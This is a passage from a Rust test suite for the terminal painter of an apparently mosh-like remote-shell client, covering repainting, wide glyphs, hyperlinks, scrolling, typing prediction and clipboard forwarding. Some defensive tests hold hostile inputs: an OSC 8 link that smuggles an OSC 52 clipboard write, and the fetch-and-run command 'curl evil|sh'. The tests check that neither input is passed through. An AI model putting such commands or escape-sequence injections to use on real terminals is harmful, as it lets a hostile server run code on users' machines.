        terminal.process(first_frame(&screen).as_bytes()).unwrap();
        terminal.process(painted.as_bytes()).unwrap();
        let mut echoed = terminal_of(24, 80);
        let echo = first_frame(&screen_of("本x\x1b[1;1Ha".as_bytes()));
        echoed.process(echo.as_bytes()).unwrap();
        assert_eq!(shown(&terminal), shown(&echoed));
    }

    /// A terminal of `rows`×`cols`, as the user's.
    fn terminal_of(rows: u16, cols: u16) -> fux_vt::Parser {
        fux_vt::Parser::new(fux_vt::Size::new(rows, cols).expect("nonzero size"), 0).unwrap()
    }

    #[test]
    fn a_modifier_placed_in_a_cell_of_its_own_is_not_joined_to_the_glyph_before_it() {
        // vim places 👍 and then 🏽 with a cursor move between them, so the screen holds two
        // cells; printed one after the other they would be one cluster on the user's terminal.
        let two = grid(6, 20, "\u{1f44d}\x1b[1;3H\u{1f3fd}".as_bytes());
        let looks = |terminal: &fux_vt::Parser| {
            [0, 2].map(|col| {
                terminal
                    .screen()
                    .cell(0, col)
                    .map(|c| c.contents().to_owned())
            })
        };
        let expected = [Some("\u{1f44d}".to_owned()), Some("\u{1f3fd}".to_owned())];
        let empty = Overlay::default();
        // Painted whole.
        let mut terminal = terminal_of(6, 20);
        paint_into(&mut Painter::default(), &mut terminal, &two, &empty);
        assert_eq!(looks(&terminal), expected);
        // Painted as a change: the two cells after one another on a row painted before.
        let mut painter = Painter::default();
        let mut terminal = terminal_of(6, 20);
        paint_into(&mut painter, &mut terminal, &grid(6, 20, b"ab"), &empty);
        paint_into(&mut painter, &mut terminal, &two, &empty);
        assert_eq!(looks(&terminal), expected);
    }

    #[test]
    fn a_programs_colours_are_painted_without_changing_the_users_palette() {
        let screen = grid(6, 20, b"\x1b]4;1;#ff0000\x07\x1b]11;#000080\x07\x1b[31mR");
        let painted = paint_at(
            &mut Painter::default(),
            SMALL,
            &screen,
            &Overlay::default(),
            None,
        );
        for osc in ["\x1b]4", "\x1b]10", "\x1b]11", "\x1b]104"] {
            assert!(!painted.contains(osc), "{osc:?} sent: {painted:?}");
        }
        let options = fux_vt::Options::new().with(fux_vt::Feature::Palette);
        let mut terminal = fux_vt::Parser::with_options(
            fux_vt::Size::new(6, 20).expect("nonzero size"),
            0,
            options,
        )
        .unwrap();
        terminal.process(painted.as_bytes()).unwrap();
        assert!(!terminal.screen().colors_changed(), "the user's palette");
        let cell = terminal.screen().cell(0, 0).unwrap();
        let rgb = |r, g, b| Color::Rgb(fux_vt::Rgb { r, g, b });
        assert_eq!(
            (cell.contents(), cell.fgcolor(), cell.bgcolor()),
            ("R", rgb(0xff, 0, 0), rgb(0, 0, 0x80))
        );
    }

    /// A terminal that keeps hyperlinks, `rows`×`cols`.
    fn linking_terminal(rows: u16, cols: u16) -> fux_vt::Parser {
        let options = fux_vt::Options::new().with(fux_vt::Feature::Hyperlinks);
        fux_vt::Parser::with_options(
            fux_vt::Size::new(rows, cols).expect("nonzero size"),
            0,
            options,
        )
        .unwrap()
    }

    /// What a painter (with links `on`) paints for `screen`, a 6×20 one.
    fn painted_with_links(screen: &Grid, on: bool) -> String {
        let mut painter = Painter::default();
        painter.set_hyperlinks(on);
        paint_at(&mut painter, SMALL, screen, &Overlay::default(), None)
    }

    #[test]
    fn a_hyperlink_is_painted_as_one_and_closed_after() {
        let screen = grid(
            6,
            20,
            b"a\x1b]8;id=x;https://example.org/\x1b\\link\x1b]8;;\x1b\\b",
        );
        let painted = painted_with_links(&screen, true);
        assert!(
            painted.contains("\x1b]8;id=x;https://example.org/\x1b\\link\x1b]8;;\x1b\\b"),
            "{painted:?}"
        );
        let mut terminal = linking_terminal(6, 20);
        terminal.process(painted.as_bytes()).unwrap();
        let link = |col| {
            terminal
                .screen()
                .link(0, col)
                .map(|l| (l.uri().to_owned(), l.id().map(str::to_owned)))
        };
        assert_eq!(link(0), None);
        for col in 1..5 {
            assert_eq!(
                link(col),
                Some(("https://example.org/".to_owned(), Some("x".to_owned())))
            );
        }
        assert_eq!(link(5), None);
        assert!(terminal.screen().hyperlink().is_none(), "none left open");
        // With links off (`--no-hyperlinks`), the text alone.
        assert!(!painted_with_links(&screen, false).contains("\x1b]8"));
    }

    /// A row whose text stays and whose link changes is painted again: rows compare whole.
    #[test]
    fn a_hyperlink_only_change_is_painted() {
        let linked = grid(
            6,
            20,
            b"\x1b]8;;https://example.org/\x1b\\link\x1b]8;;\x1b\\",
        );
        let mut painter = Painter::default();
        painter.set_hyperlinks(true);
        let mut terminal = linking_terminal(6, 20);
        for screen in [&grid(6, 20, b"link"), &linked] {
            paint_into(&mut painter, &mut terminal, screen, &Overlay::default());
        }
        for col in 0..4 {
            assert_eq!(
                terminal.screen().link(0, col).map(|l| l.uri().to_owned()),
                Some("https://example.org/".to_owned()),
                "column {col}"
            );
        }
    }

    #[test]
    fn a_servers_link_that_is_not_safe_to_write_is_painted_as_plain_text() {
        use crate::terminal::WireLink;
        // A hostile server's link that would end the OSC 8 and set the clipboard, or carry a
        // space, or an id with a separator: each painted as its text, with no escape sequence.
        let text = TerminalScreen::from_bytes(6, 20, b"link");
        for (uri, id) in [
            ("x\x1b]52;c;Y3VybCBldmlsfHNo\x07", ""),
            ("https://example.org/a b", ""),
            ("https://example.org/", "a;b"),
            ("", ""),
        ] {
            let mut diff = text.diff_from(&TerminalScreen::default());
            for row in &mut diff.rows {
                row.links = vec![WireLink {
                    uri: uri.to_owned(),
                    id: id.to_owned(),
                }];
                for run in &mut row.runs {
                    run.cell.link = 1;
                }
            }
            let mut screen = TerminalScreen::default();
            screen.apply(&diff).unwrap();
            assert!(screen.screen().link(0, 0).is_some(), "the link arrived");
            let painted = painted_with_links(screen.screen(), true);
            assert!(painted.contains("link"), "{painted:?}");
            assert!(
                !painted.contains("\x1b]8") && !painted.contains("\x1b]52"),
                "{uri:?} {id:?}: {painted:?}"
            );
        }
    }

    /// Type `typed` where the program shows `before` (once a first keystroke confirmed that it
    /// echoes), and paint the predictions; then let the program echo it with `echo` and paint
    /// that. The terminal showed with the predictions exactly what it shows with the echo, the
    /// cursor and every cell's style included, and the echo confirms every prediction.
    fn predicted_typing_shows_the_echo(before: &str, typed: &str, echo: &str) {
        let mut emu = crate::terminal::ServerTerminal::new(6, 20, 0).unwrap();
        let mut engine = PredictionEngine::default();
        engine.set_tty(Some(TtyModes {
            echo: false,
            line: false,
        }));
        engine.set_local_frame_sent(0);
        engine.type_bytes(b">", emu.snapshot().screen());
        emu.process(b">");
        engine.set_local_frame_late_acked(1);
        engine.cull(emu.snapshot().screen());
        emu.process(before.as_bytes());
        let screen = emu.snapshot();

        let empty = Overlay::default();
        let mut painter = Painter::default();
        let mut terminal = terminal_of(6, 20);
        paint_into(&mut painter, &mut terminal, screen.screen(), &empty);
        engine.set_local_frame_sent(1);
        engine.type_bytes(typed.as_bytes(), screen.screen());
        let overlay = engine.overlay();
        assert!(overlay.cells().count() > 0, "{typed:?} is predicted");
        paint_into(&mut painter, &mut terminal, screen.screen(), &overlay);
        let predicted = shown(&terminal);

        emu.process(echo.as_bytes());
        let echoed = emu.snapshot();
        let confirmed = engine.confirmed_epoch();
        engine.set_local_frame_late_acked(2);
        engine.cull(echoed.screen());
        assert!(
            engine.overlay().is_empty(),
            "{typed:?}: every prediction graded"
        );
        assert!(
            engine.confirmed_epoch() >= confirmed,
            "{typed:?}: nothing killed"
        );
        let mut whole = terminal_of(6, 20);
        paint_into(&mut Painter::default(), &mut whole, echoed.screen(), &empty);
        assert_eq!(predicted, shown(&whole), "{before:?} then {typed:?}");
        // Painting the echo over the predictions changes nothing the terminal shows.
        let overlay = engine.overlay();
        paint_into(&mut painter, &mut terminal, echoed.screen(), &overlay);
        assert_eq!(shown(&terminal), shown(&whole), "{before:?} then {typed:?}");
    }

    #[test]
    fn typing_wide_glyphs_shows_what_the_echo_shows() {
        // A line editor inserts a typed glyph, moving the rest of the line right: here as
        // insert-character, as wide as the glyph, then the glyph.
        let inserted = |typed: &str| -> String {
            typed
                .chars()
                .flat_map(|c| [format!("\x1b[{}@", c.width().unwrap_or(1)), c.to_string()])
                .collect()
        };
        for (before, typed) in [
            // Over blank cells.
            ("", "日本\u{1f980}"),
            // Before narrow text.
            ("abcdefgh\x1b[1;2H", "日"),
            ("abcdef\x1b[1;4H", "\u{1f980}"),
            // Before wide text, between its glyphs.
            ("本本本\x1b[1;3H", "日"),
            ("a本本\x1b[1;2H", "日\u{1f980}"),
            // A narrow glyph before wide text, which moves whole.
            ("本本x\x1b[1;2H", "a"),
            ("ab本c\x1b[1;3H", "z"),
        ] {
            predicted_typing_shows_the_echo(before, typed, &inserted(typed));
        }
    }

    /// A grid whose row 0 is `ab` and whose last cell, at `(row, cols - 1)`, is a wide glyph, as
    /// only a hostile server sends: the terminal could not show it there.
    fn wide_in_the_last_column(row: u16) -> Grid {
        use crate::terminal::{CellKind, CellText, RowDiff, Run, TerminalScreen, WireCell};
        use crate::terminal::{WireColor, WireStyle};
        let base = TerminalScreen::from_bytes(6, 20, b"ab");
        let cell = |text, kind| WireCell {
            text: CellText::new(text).unwrap(),
            kind,
            fg: WireColor::Default,
            bg: WireColor::Default,
            underline_color: WireColor::Default,
            style: WireStyle::default(),
            link: 0,
        };
        let mut diff = base.diff_from(&base);
        diff.rows = vec![RowDiff {
            row,
            wrapped: false,
            runs: vec![
                Run {
                    count: std::num::NonZeroU16::new(19).unwrap(),
                    cell: cell("", CellKind::Narrow),
                },
                Run {
                    count: std::num::NonZeroU16::MIN,
                    cell: cell("世", CellKind::Wide),
                },
            ],
            links: Vec::new(),
        }];
        let mut malformed = base;
        malformed.apply(&diff).unwrap();
        assert!(malformed
            .screen()
            .cell(row, 19)
            .is_some_and(|c| c.is_wide()));
        malformed.screen().clone()
    }

    /// A wide glyph in the bottom-right cell never scrolls the user's terminal: autowrap is off
    /// while a frame paints, and a glyph that cannot fill its cells there is a blank.
    /// A wide glyph in the bottom-right cell never scrolls the user's terminal: autowrap is off
    /// while a frame paints, and a glyph that cannot fill its cells there is a blank.
    #[test]
    fn a_wide_glyph_in_the_bottom_right_cell_does_not_scroll() {
        let malformed = wide_in_the_last_column(5);
        let empty = Overlay::default();
        let mut terminal = terminal_of(6, 20);
        // A shell at the user's terminal had autowrap on.
        terminal.process(b"\x1b[?7h").unwrap();
        let mut painter = Painter::default();
        paint_into(&mut painter, &mut terminal, &malformed, &empty);
        paint_into(&mut painter, &mut terminal, &malformed, &empty);
        let row = |r| {
            (0..20)
                .map(|c| {
                    terminal
                        .screen()
                        .cell(r, c)
                        .map(|c| c.contents().to_owned())
                })
                .collect::<Option<String>>()
        };
        assert_eq!(row(0).as_deref(), Some("ab"), "the screen did not scroll");
        assert!(
            terminal.screen().mode(fux_vt::Mode::Autowrap),
            "autowrap on after"
        );
        // The next frame paints only what changed: no row is repainted for it.
        assert_eq!(
            paint_at(&mut painter, SMALL, &malformed, &empty, None),
            framed("", "1;3")
        );
    }

    /// A terminal of another size than the screen shows the screen clipped to it, and nothing
    /// else: what lies outside the screen is erased, and a terminal smaller than the screen gets
    /// no cell past its edge.
    #[test]
    fn a_terminal_of_another_size_shows_the_screen_clipped_and_nothing_else() {
        let screen = grid(6, 20, b"abcdefghijklmnopqrst\r\nrow two");
        let empty = Overlay::default();
        // Larger: what the terminal showed outside the screen is gone.
        let mut terminal = terminal_of(8, 30);
        terminal.process(b"\x1b[8;30Hz\x1b[1;25Hy").unwrap();
        paint_into(&mut Painter::default(), &mut terminal, &screen, &empty);
        let text: String = (0..8)
            .flat_map(|row| (0..30).map(move |col| (row, col)))
            .filter_map(|(row, col)| terminal.screen().cell(row, col))
            .map(|cell| cell.contents().to_owned())
            .collect();
        assert!(!text.contains('z') && !text.contains('y'), "{text:?}");
        assert!(text.starts_with("abcdefghijklmnopqrstrow"), "{text:?}");
        // Smaller: clipped, the rows below and the cells right of it never painted.
        let painted = paint_at(
            &mut Painter::default(),
            Size::new(1, 10),
            &screen,
            &empty,
            None,
        );
        assert!(
            painted.contains("abcdefghij") && !painted.contains('k'),
            "{painted:?}"
        );
        assert!(!painted.contains("row two"), "{painted:?}");
    }

    /// The text of row `row` of [`lettered`]: a letter repeated, so no two rows share a cell.
    fn letters(row: u8) -> String {
        char::from(b'a'.saturating_add(row)).to_string().repeat(12)
    }

    /// Six rows of letters, 6×20.
    fn lettered() -> crate::terminal::ServerTerminal {
        let mut emu = crate::terminal::ServerTerminal::new(6, 20, 0).unwrap();
        for (row, line) in (0..6).zip(1..) {
            emu.process(format!("\x1b[{line};1H{}", letters(row)).as_bytes());
        }
        emu
    }

    /// The bytes painting `more` after the screen `emu` shows, on a terminal `size` large.
    fn after(
        emu: &mut crate::terminal::ServerTerminal,
        more: &[u8],
        status: Option<&str>,
        size: Size,
    ) -> String {
        let mut painter = Painter::default();
        let empty = Overlay::default();
        paint_at(&mut painter, size, emu.snapshot().screen(), &empty, status);
        emu.process(more);
        paint_at(&mut painter, size, emu.snapshot().screen(), &empty, status)
    }

    /// A scroll scrolls the terminal and paints only the new row; under a status line, only the
    /// rows above it; on a terminal larger than the screen, nothing scrolls.
    #[test]
    fn a_scroll_scrolls_the_terminal_and_paints_only_the_new_row() {
        let scroll = format!("\r\n{}", letters(6));
        let painted = after(&mut lettered(), scroll.as_bytes(), None, SMALL);
        assert_eq!(
            painted,
            framed(
                &format!("\x1b[m\x1b[1;6r\x1b[1S\x1b[r\x1b[6;1H{}\x1b[m", letters(6)),
                "6;13"
            )
        );
        // Rows 1..=5 scroll; row 5 then shows what the status line hid, and the status line's
        // row keeps the status, with the screen's new row beside it.
        let painted = after(&mut lettered(), scroll.as_bytes(), Some("down"), SMALL);
        assert!(painted.contains("\x1b[1;5r\x1b[1S\x1b[r"), "{painted:?}");
        assert!(
            painted.contains(&format!("\x1b[5;1H{}", letters(5))),
            "{painted:?}"
        );
        assert!(painted.contains("\x1b[6;7Hgggggg"), "{painted:?}");
        assert!(!painted.contains("down"), "{painted:?}");
        let painted = after(&mut lettered(), scroll.as_bytes(), None, Size::new(8, 30));
        assert!(!painted.contains("\x1b[r"), "{painted:?}");
        assert!(painted.contains(&letters(6)), "{painted:?}");
    }

    #[test]
    fn a_scroll_region_and_inserted_lines_scroll_only_their_rows() {
        // A region of rows 2..=5 scrolled up, a line inserted at row 3 (down to the bottom).
        for (more, scroll) in [
            (&b"\x1b[2;5r\x1b[5;1H\n"[..], "\x1b[2;5r\x1b[1S\x1b[r"),
            (b"\x1b[3;1H\x1b[L", "\x1b[3;6r\x1b[1T\x1b[r"),
        ] {
            let painted = after(&mut lettered(), more, None, SMALL);
            assert!(painted.contains(scroll), "{painted:?}");
            assert!(!painted.contains("aaa"), "no row repainted: {painted:?}");
        }
    }

    #[test]
    fn a_scroll_that_would_write_more_than_it_saves_is_not_made() {
        // Rows that all read the same: in place, the scrolled rows already show what they would
        // bring, so only the new row is painted, and nothing scrolls.
        let mut emu = crate::terminal::ServerTerminal::new(6, 20, 0).unwrap();
        for row in 1..=6 {
            emu.process(format!("\x1b[{row};1Hthe same").as_bytes());
        }
        let painted = after(&mut emu, b"\r\nthe same", None, SMALL);
        assert_eq!(painted, framed("", "6;9"));
    }

    /// Output that exercises what a frame can change: text, wide glyphs, combining marks, clusters
    /// (a ZWJ family, a flag, a heart a variation selector widens), colours and every attribute,
    /// cursor motion, erasing, scrolling (the whole screen and in a region, up and down),
    /// inserting and deleting lines, wrapping, hyperlinks.
    const PIECES: [&str; 38] = [
        "\u{1f468}\u{200d}\u{1f469}\u{200d}\u{1f467}",
        "\u{1f1fa}\u{1f1f8}",
        "\u{2764}\u{fe0f}",
        "\x1b[5;9m",
        "\x1b[6m",
        "\x1b[8m",
        "\x1b[4;58;5;9m",
        "a",
        "xyz",
        "日",
        "本",
        "é",
        "e\u{301}",
        "\u{1f980}",
        "\r\n",
        "\x1b[31m",
        "\x1b[1;7m",
        "\x1b[44m",
        "\x1b[m",
        "\x1b[H",
        "\x1b[2J",
        "\x1b[3;7H",
        "\x1b[K",
        "\x1b[2L",
        "\x1b[M",
        "\x1b[S",
        "\x1b[19G",
        "\x1b[?25l\x1b[?25h",
        "a line that wraps past the edge",
        "\x1b[6;1H\r\n",
        "\x1b[2;5r",
        "\x1b[r",
        "\x1b[5;1H\n",
        "\x1b[2;1H\x1bM",
        "\x1b[2T",
        "\x1b[3;1H\x1b[L",
        "\x1b]8;;https://example.org/\x1b\\",
        "\x1b]8;;\x1b\\",
    ];

    /// Predicted glyphs, two of them wide.
    const GLYPHS: [&str; 5] = ["Z", "", "ü", "世", "\u{1f980}"];

    /// Status lines of several lengths.
    const STATUSES: [&str; 3] = [
        "[koh] link down \u{2014} 10s",
        "[koh] link down \u{2014} 9s",
        "x",
    ];

    /// What a cell shows: its text, whether it is either half of a wide glyph, its attributes and
    /// its link.
    type Look = (String, bool, bool, fux_vt::Attributes, Option<String>);

    /// The cells and cursor a terminal shows. A printed space shows what an erased cell of its
    /// attributes does, the blank a whole repaint prints and a scroll brings in, so it counts as
    /// one.
    fn shown(terminal: &fux_vt::Parser) -> (Vec<Option<Look>>, (u16, u16)) {
        let screen = terminal.screen();
        let (rows, cols) = screen.size().into();
        let cells = (0..rows)
            .flat_map(|row| (0..cols).map(move |col| (row, col)))
            .map(|(row, col)| {
                screen.cell(row, col).map(|cell| {
                    let text = if cell.contents() == " " {
                        ""
                    } else {
                        cell.contents()
                    };
                    (
                        text.to_owned(),
                        cell.is_wide(),
                        cell.is_wide_continuation(),
                        cell.attributes(),
                        screen.link(row, col).map(|l| l.uri().to_owned()),
                    )
                })
            })
            .collect();
        (cells, screen.cursor_position())
    }

    proptest::proptest! {
        #![proptest_config(proptest::prelude::ProptestConfig::with_cases(128))]

        /// A terminal fed only what changed shows, after every frame, exactly what a terminal fed
        /// every frame whole shows: on a terminal the screen's size, a larger one and a smaller
        /// one.
        #[test]
        fn painting_what_changed_shows_what_painting_everything_shows(
            steps in proptest::collection::vec(
                (
                    proptest::collection::vec(0..PIECES.len(), 0..6),
                    proptest::option::of(0..STATUSES.len()),
                    proptest::collection::vec((0u16..6, 0u16..20, 0..GLYPHS.len()), 0..4),
                    proptest::prelude::any::<bool>(),
                ),
                1..12,
            ),
            size in proptest::sample::select(vec![SMALL, Size::new(8, 30), Size::new(4, 12)]),
        ) {
            let mut emu = crate::terminal::ServerTerminal::new(SMALL.rows, SMALL.cols, 0).unwrap();
            let mut painter = Painter::default();
            painter.set_hyperlinks(true);
            let mut incremental = linking_terminal(size.rows, size.cols);
            let mut whole = linking_terminal(size.rows, size.cols);
            for (pieces, status, predictions, covering) in steps {
                for piece in pieces {
                    emu.process(PIECES[piece].as_bytes());
                }
                let screen = emu.snapshot();
                // Wide glyphs cover the next cell, as the predictor makes them; or, now and then,
                // not, as a hostile one might.
                let overlay = Overlay::of(
                    predictions.into_iter().map(|(row, col, glyph)| {
                        ((row, col), GLYPHS[glyph], Attributes::new(Color::Idx(2), Color::Default), covering)
                    }),
                    None,
                );
                let status = status.map(|status| STATUSES[status]);
                let changed = paint_at(&mut painter, size, screen.screen(), &overlay, status);
                let mut fresh = Painter::default();
                fresh.set_hyperlinks(true);
                let everything = paint_at(&mut fresh, size, screen.screen(), &overlay, status);
                incremental.process(changed.as_bytes()).unwrap();
                whole.process(everything.as_bytes()).unwrap();
                proptest::prop_assert_eq!(shown(&incremental), shown(&whole));
            }
        }
    }

    /// Build a `WindowState` for tests.
    fn win<'a>(title: &'a str, icon: &'a str, clipboard: &'a str, bell: u64) -> WindowState<'a> {
        WindowState {
            title,
            icon,
            clipboard,
            bell_count: bell,
        }
    }

    /// Run one `OutOfBand::emit` into a fresh capture backend and return what it emitted.
    fn oob_emit(oob: &mut OutOfBand, screen: &Grid, win: WindowState<'_>) -> String {
        let mut backend = CaptureBackend::default();
        oob.emit(&mut backend, screen.modes().mouse_mode, win)
            .unwrap();
        String::from_utf8(backend.bytes).unwrap()
    }

    #[test]
    fn out_of_band_title_emits_once_and_guards_empty() {
        let mut oob = OutOfBand::default();
        let scr = screen_of(b"");
        let mut title = |title| oob_emit(&mut oob, &scr, win(title, title, "", 0));
        // Empty title/icon before the shell sets one: never blank the user's terminal title.
        assert!(!title("").contains("\x1b]"), "no OSC for an unset title");
        // A real title (icon == title) is emitted as the combined OSC 0, and not again unchanged.
        assert!(title("vim - file.rs").contains("\x1b]0;vim - file.rs\x07"));
        assert!(!title("vim - file.rs").contains("\x1b]0;"));
        // Once initialized, a reset to empty IS propagated (mosh's sticky guard).
        assert!(title("").contains("\x1b]0;\x07"));
    }

    /// A title equal to its icon name goes as the combined OSC 0; a distinct icon name as OSC 1,
    /// then the title as OSC 2 (mosh). A prefix goes on the title, and on the icon only when they
    /// are equal (mosh's prefix_window_title); with none (the default), nothing is added.
    #[test]
    fn out_of_band_prefixes_and_splits_icon_and_title() {
        for (prefix, title, icon, sent) in [
            ("", "vim", "vim", &["\x1b]0;vim\x07"][..]),
            ("[koh] ", "vim", "vim", &["\x1b]0;[koh] vim\x07"]),
            (
                "",
                "the title",
                "the-icon",
                &["\x1b]1;the-icon\x07", "\x1b]2;the title\x07"],
            ),
            (
                "[koh] ",
                "the title",
                "the-icon",
                &["\x1b]1;the-icon\x07", "\x1b]2;[koh] the title\x07"],
            ),
        ] {
            let mut oob = OutOfBand::with_title_prefix(prefix.to_owned());
            let out = oob_emit(&mut oob, &screen_of(b""), win(title, icon, "", 0));
            for osc in sent {
                assert!(out.contains(osc), "{prefix:?} {title:?} {icon:?}: {out:?}");
            }
        }
    }

    /// A new clipboard reaches the terminal once, and only when clipboard writes are on, as base64
    /// within the cap: never raw shell injection, a query (`OSC 52 ; c ; ?`, which would ask the
    /// user's terminal for their clipboard), or an oversized payload.
    #[test]
    fn only_a_base64_clipboard_is_forwarded_and_only_when_on() {
        let huge = "A".repeat(MAXIMUM_CLIPBOARD_SIZE.saturating_add(4));
        for (on, clipboard, forwarded) in [
            (false, "aGVsbG8=", false),
            (true, "aGVsbG8=", true),
            (true, "curl evil|sh", false),
            (true, "?", false),
            (true, &huge, false),
        ] {
            let mut oob = OutOfBand::default().with_clipboard(on);
            oob.prime(win("", "", "", 0));
            let scr = screen_of(b"");
            let out = oob_emit(&mut oob, &scr, win("", "", clipboard, 0));
            let osc = format!("\x1b]52;c;{clipboard}\x07");
            assert_eq!(out.contains("\x1b]52;"), forwarded, "{on} {out:?}");
            assert_eq!(out.contains(&osc), forwarded, "{on} {out:?}");
            // The same clipboard again is not re-emitted.
            let again = oob_emit(&mut oob, &scr, win("", "", clipboard, 0));
            assert!(!again.contains("\x1b]52;"), "{again:?}");
        }
    }

    /// What the first frame shows of the clipboard and bell was there before the client came, and
    /// a resume from suspend, which re-asserts the modes, does not replay either. A bell count
    /// that climbs (by however much) rings once.
    #[test]
    fn neither_the_first_frames_clipboard_and_bells_nor_a_resume_reach_the_terminal() {
        let mut oob = OutOfBand::default().with_clipboard(true);
        let scr = screen_of(b"");
        oob.prime(win("", "", "aGVsbG8=", 5));
        let first = oob_emit(&mut oob, &scr, win("", "", "aGVsbG8=", 5));
        assert!(!first.contains('\x07') && !first.contains("\x1b]52;"));
        oob.invalidate();
        let resumed = oob_emit(&mut oob, &scr, win("", "", "aGVsbG8=", 5));
        assert!(
            !resumed.contains('\x07') && !resumed.contains("\x1b]52;"),
            "{resumed:?}"
        );
        // A session restarted under the client counts its bells from zero: no bell for that.
        let mut bells = |count| oob_emit(&mut oob, &scr, win("", "", "aGVsbG8=", count));
        assert_eq!(bells(0), "");
        assert_eq!(bells(1), "\x07");
        assert_eq!(bells(1), "", "no bell when the count is unchanged");
        assert_eq!(
            bells(4),
            "\x07",
            "one bell on an increase, even if it jumped"
        );
    }
}
